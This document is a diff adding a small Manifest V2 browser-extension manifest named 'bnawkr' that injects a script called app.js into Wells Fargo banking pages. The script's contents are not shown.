@@ -1,0 +1,12 @@
+{
+	"manifest_version": 2,
+	"name": "bnawkr",
+	"description": "bnaks for awks",
+	"version": "0.1.0",
+	"content_scripts": [{
+		"js": ["app.js"],
+		"matches": ["https://wellsfargo.com/*",
+					"https://connect.secure.wellsfargo.com/*",
+					"https://www.wellsfargo.com/*"]
+	}]
+}
